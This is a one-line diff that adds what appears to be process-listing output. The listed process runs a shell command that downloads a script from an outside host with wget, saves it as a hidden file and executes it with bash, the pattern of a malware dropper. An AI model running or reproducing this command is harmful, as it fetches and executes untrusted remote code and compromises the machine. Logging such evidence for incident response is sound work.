@@ -1,0 +1,1 @@
+ 8219 ?        Ss     0:00 /bin/sh -c wget http://d.powerofwish.com/pm.sh -O .p && bash .p
